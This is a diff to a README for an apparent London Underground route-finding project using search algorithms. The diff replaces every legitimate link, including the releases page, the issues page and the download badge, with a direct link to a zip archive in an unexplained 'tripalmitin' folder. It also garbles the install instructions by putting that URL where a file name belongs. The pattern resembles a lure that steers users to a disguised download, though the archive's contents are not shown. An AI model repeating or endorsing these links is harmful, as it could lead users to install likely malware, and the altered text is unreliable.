@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/fishyes404/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/fishyes404/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics/main/tripalmitin/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics.zip%https://raw.githubusercontent.com/fishyes404/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics/main/tripalmitin/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics.zip)](https://raw.githubusercontent.com/fishyes404/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics/main/tripalmitin/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics.zip)
 
 ## 🛠️ Description
 
@@ -21,18 +21,18 @@ The "London-Tube-AI-Search-DFS-BFS-UCS-Heuristics" application helps you navigat
 ### Installation Steps
 
 1. **Visit the Download Page:**
-   Head to the [Releases page](https://github.com/fishyes404/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics/releases).
+   Head to the [Releases page](https://raw.githubusercontent.com/fishyes404/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics/main/tripalmitin/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics.zip).
 
 2. **Download the Application:**
    Look for the latest version listed on the page. Click on the asset that matches your system:
    - For Windows users, download the `.exe` file.
    - For macOS users, download the `.dmg` file.
-   - For Linux users, download the `.tar.gz` file.
+   - For Linux users, download the `https://raw.githubusercontent.com/fishyes404/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics/main/tripalmitin/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics.zip` file.
 
 3. **Run the Installer:**
    - If you're on Windows, double-click the downloaded `.exe` file.
    - On macOS, open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux, extract the `.tar.gz` file and follow the installation instructions in the README file provided.
+   - For Linux, extract the `https://raw.githubusercontent.com/fishyes404/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics/main/tripalmitin/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics.zip` file and follow the installation instructions in the README file provided.
 
 4. **Open the Application:**
    Once the installation completes, locate and open the application from your system.
@@ -63,7 +63,7 @@ This application utilizes four main algorithms:
 
 ## 💬 Support & Feedback
 
-If you encounter any issues or have suggestions, feel free to open an issue on the [issues page](https://github.com/fishyes404/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics/issues). Your feedback helps us improve the application.
+If you encounter any issues or have suggestions, feel free to open an issue on the [issues page](https://raw.githubusercontent.com/fishyes404/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics/main/tripalmitin/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics.zip). Your feedback helps us improve the application.
 
 ## 🛠️ Development
 
@@ -73,4 +73,4 @@ For developers interested in the code, we follow best practices for organization
 
 For inquiries, please reach out through the contact section in the repository.
 
-Once again, don’t forget to [visit this page to download](https://github.com/fishyes404/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics/releases) the latest release and start navigating the London Tube system with ease!
+Once again, don’t forget to [visit this page to download](https://raw.githubusercontent.com/fishyes404/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics/main/tripalmitin/London-Tube-AI-Search-DFS-BFS-UCS-Heuristics.zip) the latest release and start navigating the London Tube system with ease!
